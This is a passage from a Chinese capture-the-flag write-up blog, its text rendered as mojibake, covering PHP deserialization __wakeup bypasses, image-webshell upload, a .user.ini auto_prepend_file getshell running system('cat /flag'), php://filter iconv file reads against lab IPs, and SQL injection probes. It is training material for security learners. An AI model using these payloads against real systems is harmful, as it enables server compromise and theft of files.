class="comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸º</span></span><br><span class="line"><span class="comment">//è¿™é‡Œä¹Ÿå°±æ˜¯å®šä¹‰äº†äº†ä¸€ä¸ªæ–°çš„ç±»ç”¨æ¥ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()åºåˆ—åŒ–å‡½æ•°</span></span><br><span class="line"><span class="comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè¯¥phpä»£ç ï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><img src="/post/wp-Gongfang/image-20220627215806623.png" alt="image-20220627215806623"></p>
<p>å¦‚æœçœ‹ä¸æ‡‚ï¼Œå¯ä»¥çœ‹çœ‹æ–¹ä¾¿ä¸‹å›¾ç†è§£</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>è¿™é‡Œå¦‚æœç›´æ¥è®¿é—®ï¼Œä¼šå¤±è´¥</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p><img src="/post/wp-Gongfang/image-20220627220136916.png" alt="image-20220627220136916"></p>
<p>å› ä¸ºæˆ‘ä»¬å¿½ç•¥äº†<code>__wakeup()</code>ï¼Œè¿™é‡Œå°±éœ€è¦äº†è§£phpçš„é­”æœ¯æ–¹æ³•å½“ä¸­çš„ç»•è¿‡__wakeup()</p>
<p><code>å¦‚ä½•ç»•è¿‡__wakeup()ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p>
<p>åœ¨è¿™ä¸²åºåˆ—åŒ–çš„ä»£ç ä¸­ï¼Œå¯¹è±¡å±æ€§æ•°ä¸º1ï¼ŒæŠŠä¸‹åˆ—çš„1æ”¹ä¸º2(&gt;1)ï¼Œå³å¯</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>â€“&gt;</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<hr>
<p>è¿™é‡Œæˆ‘æ’å…¥ä¸€ä¸ªæ–°å­¦åˆ°çš„payload</p>
<p><code>C:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>å‘ç°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡<code>__wakeup()</code>å‡½æ•°</p>
<p>Cä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œserializeableä¸æ”¯æŒwakeupï¼Œå°±ç»•è¿‡å»äº†</p>
<hr>
<p>ç„¶åpayload:</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p>å¾—åˆ°flag</p>
<p>è¡¥å……ï¼š</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">phpå®ä¾‹åŒ–ï¼šæ˜¯æŒ‡åœ¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ä¸­ï¼ŒæŠŠç”¨ç±»åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºå®ä¾‹åŒ–ï¼Œæ˜¯å°†ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µç±»ï¼Œå…·ä½“åˆ°è¯¥ç±»å®ç‰©çš„è¿‡ç¨‹ï¼Œå®ä¾‹åŒ–è¿‡ç¨‹ä¸­ä¸€èˆ¬ç”±ã€ç±»å å¯¹è±¡å = <span class="keyword">new</span> ç±»åï¼ˆå‚æ•°<span class="number">1</span>ï¼Œå‚æ•°<span class="number">2.</span>..å‚æ•°nï¼‰ã€‘æ„æˆã€‚</span><br><span class="line"></span><br><span class="line">phpç±»å¯¹è±¡æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</span><br><span class="line">ç±» âˆ’ å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚</span><br><span class="line">å¯¹è±¡ âˆ’ æ˜¯ç±»çš„å®ä¾‹ã€‚</span><br><span class="line">åœ¨é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ï¼ˆè‹±è¯­ï¼š<span class="built_in">Object</span>-oriented programmingï¼Œç¼©å†™ï¼šOOPï¼‰ä¸­ï¼Œå¯¹è±¡æ˜¯ä¸€ä¸ªç”±ä¿¡æ¯åŠå¯¹ä¿¡æ¯è¿›è¡Œå¤„ç†çš„æè¿°æ‰€ç»„æˆçš„æ•´ä½“ï¼Œæ˜¯å¯¹ç°å®ä¸–ç•Œçš„æŠ½è±¡ã€‚åœ¨ç°å®ä¸–ç•Œé‡Œæˆ‘ä»¬æ‰€é¢å¯¹çš„äº‹æƒ…éƒ½æ˜¯å¯¹è±¡ï¼Œå¦‚è®¡ç®—æœºã€ç”µè§†æœºã€è‡ªè¡Œè½¦ç­‰ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-é¢˜ç›®æè¿°-23"><a href="#1-é¢˜ç›®æè¿°-23" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯ä»¥å…ˆæŠŠupload-labsçº¿ä¸‹é¶åœºå­¦ä¹ ä¸€ä¸‹</p>
<p>å…ˆç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‘ç°è¢«æ‹¦æˆª</p>
<p><img src="/post/wp-Gongfang/image-20220704104557362.png" alt="image-20220704104557362"></p>
<p>äºæ˜¯æ„é€ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ä¸Šä¼ ï¼Œç„¶åburpä¿®æ”¹åç¼€ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯</p>
<p><img src="/post/wp-Gongfang/image-20220704104752019.png" alt="image-20220704104752019"></p>
<p><img src="/post/wp-Gongfang/image-20220704104814064.png" alt="image-20220704104814064"></p>
<p>å‘ç°ä¸Šä¼ æˆåŠŸ</p>
<p><img src="/post/wp-Gongfang/image-20220704104830480.png" alt="image-20220704104830480"></p>
<p>ç”¨èšå‰‘è¯•ç€è¿ä¸€ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220704105115729.png" alt="image-20220704105115729"></p>
<p>å‘ç°è¿æ¥æˆåŠŸï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œåœ¨htmlä¸‹å‘ç°flag.php</p>
<p><img src="/post/wp-Gongfang/image-20220704105139801.png" alt="image-20220704105139801"></p>
<p>æ‰“å¼€æ–‡ä»¶</p>
<p>å¾—åˆ°flag</p>
<hr>
<p>åé¢çš„é¢˜éš¾åº¦é£å‡ï¼Œæ°´å¹³æœ‰é™ï¼Œåé¢çš„é¢˜ä»…å†™ä¸€äº›ä¸ªäººç¬”è®°ï¼Œå»ºè®®è®¤çœŸé˜…è¯»å…¶ä»–å¤§ä½¬çš„wpï¼Œé‡åˆ°éš¾ç‚¹ï¼Œå»ºè®®å…ˆå·©å›ºæ¦‚å¿µåŸºç¡€</p>
<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>ä¸€é“tornadoæ¡†æ¶é¢˜ï¼Œå±äºsstiæ³¨å…¥ï¼Œå»ºè®®å…ˆçœ‹ä¸€äº›æ–‡ç« </p>
<p>äº†è§£äº†å†å°è¯•å®Œæˆ</p>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-é¢˜ç›®æè¿°-24"><a href="#1-é¢˜ç›®æè¿°-24" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>ä¸€ååˆæ ¼çš„é»‘å®¢çœ¼ä¸­ï¼Œæ‰€æœ‰çš„ä¸Šä¼ ç‚¹éƒ½æ˜¯å¼€å‘è€…ç•™ä¸‹çš„åé—¨</p>
<h3 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h3><p><u><em>è¿™é“é¢˜å†™çš„1æ˜Ÿï¼Œä½†æ˜¯è¿‡æ»¤åˆå¤šï¼Œè¿˜æ¶‰åŠäº†ä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œå­¦åˆ°äº†,ä¸‹é¢æ˜¯å¤§ä½¬çš„wp</em></u></p>
<p>æœ¬é¢˜éœ€è¦åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ï¼Œé€šè¿‡ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é˜²æŠ¤ï¼Œè¾¾åˆ°getshellçš„ç›®çš„</p>
<p>æœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹ä¸ºåˆ©ç”¨fastcgiçš„.user.iniç‰¹æ€§è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p>
<ul>
<li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰phpå­—ç¬¦ä¸²</li>
<li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph</li>
<li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li>
<li>æ–‡ä»¶MIMEç±»å‹</li>
</ul>
<p>å¯¹äºç¬¬ä¸€ç‚¹å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä¾‹å¦‚ <?=phpinfo();?></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">æŠŠshort_open_tag å­—æ®µæ”¹ä¸ºOnï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">çŸ­æ ‡ç­¾ï¼š</span><br><span class="line"><span class="number">1</span>.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line">å°±ç›¸å½“äº</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ­£ç¡®ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š</span><br><span class="line">åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ</span><br><span class="line">æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡º</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¬¬äºŒç‚¹å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshell,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
<p>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</p>
<p> è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</p>
<p> å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</p>
<p>ç¬¬ä¸‰ç‚¹ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œæ¯”å¦‚<code>GIF89a</code></p>
<p>ç¬¬å››ç‚¹ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type</p>
<p>å› æ­¤æœ€ç»ˆçš„payloadä¸ºï¼š<br> ä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸º</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-file-includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘"><a href="#2-file-includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘" class="headerlink" title="2.file_includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘"></a>2.file_includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘</h2><h3 id="1-é¢˜ç›®æè¿°-25"><a href="#1-é¢˜ç›®æè¿°-25" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ€ä¹ˆè¯»å–æ–‡ä»¶å‘¢ï¼Ÿ</p>
<h3 id="2-wp-18"><a href="#2-wp-18" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«çš„é¢˜ç›®</p>
<p>ä½†æ˜¯å¼€å§‹ä¸€ç›´ç”¨ä¼ªåè®®è¯»å–éƒ½å¤±è´¥</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">61462</span>/?filename=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20230104221540491.png" alt="image-20230104221540491"></p>
<p>æ ¹æ®æºç çŒœæµ‹ï¼Œæ˜¯åœ¨<code>check.php</code>ä¸­è®¾ç½®äº†è¿‡æ»¤ï¼Œä½†æ˜¯ç›´æ¥è®¿é—®æ˜¯æ— æ³•å¾—åˆ°æ–‡ä»¶å†…å®¹çš„</p>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<h4 id="Conversion-Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰"><a href="#Conversion-Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰" class="headerlink" title="Conversion Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰"></a>Conversion Filtersï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰</h4><p><code>Conversion Filters</code>ï¼ˆè½¬æ¢è¿‡æ»¤å™¨ï¼‰å¦‚åŒ <code>string.</code> è¿‡æ»¤å™¨ï¼Œ<code>convert.</code> è¿‡æ»¤å™¨çš„ä½œç”¨å°±å’Œå…¶åå­—ä¸€æ ·ã€‚è½¬æ¢è¿‡æ»¤å™¨æ˜¯ <code>PHP 5.0.0</code> æ·»åŠ çš„ã€‚</p>
<p>å¸¸ç”¨çš„<code>convert.base64</code>å°±æ˜¯å…¶åº”ç”¨</p>
<p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæµ‹è¯•å¯ä»¥çŸ¥é“</p>
<p><img src="/post/wp-Gongfang/image-20230104222154684.png" alt="image-20230104222154684"></p>
<p>è¿™é‡Œå°†<code>base64</code>è¿‡æ»¤äº†ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è¿›è¡Œ<code>base64</code>è½¬åŒ–ï¼Œ<code>read</code>ä¹Ÿä¸èƒ½ç”¨</p>
<p>äºæ˜¯è¿™é‡Œå°±æåŠäº†</p>
<h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h5><p>è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦ php æ”¯æŒ iconvï¼Œè€Œ iconv æ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨<code>iconv()</code>å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;.&lt;output-<span class="keyword">encoding</span>&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;<span class="keyword">input</span>-<span class="keyword">encoding</span>&gt;/&lt;output-<span class="keyword">encoding</span>&gt;</span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”å•çº¯çš„<code>convert.</code>åŠ ä¸Š<code>.iconv</code>åï¼Œå¯ä»¥å°†æ•°æ®è¿›è¡Œè½¬åŒ–åï¼Œå†è¿›è¡Œè½¬åŒ–è¾“å‡º</p>
<p>è€Œå…¶èƒ½è¿›è¡ŒåŠ ç çš„æ–¹å¼æœ‰</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br></pre></td></tr></table></figure>



<p>ä½†æ˜¯è¿™äº›åŠ ç æ–¹å¼ä¹Ÿæœ‰äº›è¢«è¿‡æ»¤</p>
<p>è¿›è¡Œçˆ†ç ´å¾—åˆ°<code>UTF-7ï¼ŒUCS-4*</code>å¯ä»¥</p>
<p>ç›´æ¥æ„é€ </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">61.147.171.105:61462</span>/?filename=php://filter/convert.iconv.UTF-<span class="number">7</span>.UCS-<span class="number">4</span>*/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag</code></p>
<p><img src="/post/wp-Gongfang/image-20230104223717245.png" alt="image-20230104223717245"></p>
<hr>
<p>æŸ¥çœ‹ä¸€ä¸‹<code>check.php</code>å†…å®¹</p>
<p><img src="/post/wp-Gongfang/image-20230104223436793.png" alt="image-20230104223436793"></p>
<p>å‘ç°è¿‡æ»¤äº†</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">base|<span class="type">be</span>|<span class="type">encode</span>|<span class="type">print</span>|<span class="type">zlib</span>|<span class="type">quoted</span>|<span class="type">write</span>|<span class="type">rot13</span>|<span class="type">read</span>|<span class="type">string</span></span><br><span class="line"></span><br><span class="line">çœ‹åˆ°è¿™é‡Œè¿‡æ»¤äº†quotedï¼Œstringï¼Œæ‰€ä»¥è¿™é‡Œçš„è½¬åŒ–è¿‡æ»¤å™¨å‡½æ•°ç”¨çš„iconv()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfé¶åœºwp</title>
    <url>//post/wp-buuctf/</url>
    <content><![CDATA[<p><code>webå„ä¸ªæ–¹é¢é€‰æ‹©äº†ä¸€äº›é¢˜ç›®è¿›è¡Œå­¦ä¹ ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—ç¬¬ä¸€æ¬¡å°±åº”è¯¥çœ‹é€šå½»ï¼Œä¸åº”è¯¥ç•™æœ‰é—®é¢˜ï¼Œèƒ½å¤Ÿæ˜ç™½åŸç†å’Œä»£ç ä¸­å“ªå‡ºé€ æˆè¿™ä¸ªçš„åŸå› ï¼Œåå¤åš¼å‰©é¥­æ„Ÿè§‰æµªè´¹æ—¶é—´</code></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å› ä¸ºä¹‹å‰æ²¡æœ‰äº†è§£è¿‡å †å æ³¨å…¥ï¼Œè¿™é‡ŒæŒ¨ä¸ªåˆ†æå­¦ä¹ </p>
<p>å…ˆæ¥ç¡®å®šsqlæ³¨å…¥</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220701113045499.png" alt="image-20220701113045499"></p>
<p>ç„¶åè¯•è¯•æ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œæ„Ÿè§‰çœ‹ä¸åˆ°ä»€ä¹ˆæ„æ€ï¼Œåé¢ä¸€æ­¥æ­¥åˆ†æ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220702105520465.png" alt="image-20220702105520465"></p>
<p>ç„¶ååˆ¤æ–­å­—æ®µ</p>
<p><img src="/post/wp-buuctf/image-20220701113210998.png" alt="image-20220701113210998"></p>
<p><img src="/post/wp-buuctf/image-20220701113228972.png" alt="image-20220701113228972"></p>
<p>åˆ¤æ–­å¤„å­—æ®µæ•°ä¸º2</p>
<p>ç„¶åç”¨<strong>è”åˆæ³¨å…¥</strong></p>
<p><img src="/post/wp-buuctf/image-20220701113604165.png" alt="image-20220701113604165"></p>
<p>å‘ç°selectè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼Œç”¨å¤§å°å†™ç»•è¿‡ä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½æ¢ä¸€ç§æ–¹æ³•</p>
<p>å¯ä»¥å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">å †å æ³¨å…¥</a>çš„æ¦‚å¿µå’Œæ³¨å…¥æ–¹å¼</p>
<h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a><strong>å †å æ³¨å…¥</strong></h4><p>å…ˆæŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“</p>
<p><code>æ³¨ï¼šè¿™é‡Œä»ç„¶è¦æŸ¥è¯¢æ•°æ®ä¸ºå‡ï¼Œæ¯”å¦‚-1ï¼Œä¸ç„¶å°±ä¸ä¼šæ‰§è¡Œåé¢çš„sqlè¯­å¥</code></p>
<p><code>;é—´éš”sqlè¯­å¥</code></p>
